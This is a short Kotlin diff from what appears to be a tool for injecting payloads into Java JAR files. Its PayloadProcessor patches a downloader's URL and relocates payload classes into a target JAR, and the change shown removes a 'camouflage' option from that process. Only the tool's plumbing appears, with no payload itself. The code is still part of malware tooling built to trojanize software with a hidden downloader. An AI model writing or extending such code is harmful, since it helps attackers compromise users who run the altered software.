@@ -23,7 +23,6 @@ class PayloadProcessor(private val logger: BDLogger) {
 
     fun process(
         rawPayloadClasses: List<ClassFile>,
-        camouflageEnabled: Boolean,
         targetJar: File,
         dominantVersion: JavaVersion,
         config: Config,
@@ -33,7 +32,7 @@ class PayloadProcessor(private val logger: BDLogger) {
         val patchedDownloaderBytes = downloaderPatcher.patchUrl(downloaderUrl)
 
         val (relocationMap, finalMainPayloadName) = payloadRelocator.createRelocationPlan(
-            camouflageEnabled, targetJar, rawPayloadClasses
+            targetJar, rawPayloadClasses
         )
         val transformedBytecodeMap = payloadRelocator.transformAndRelocate(
             rawPayloadClasses, relocationMap, dominantVersion
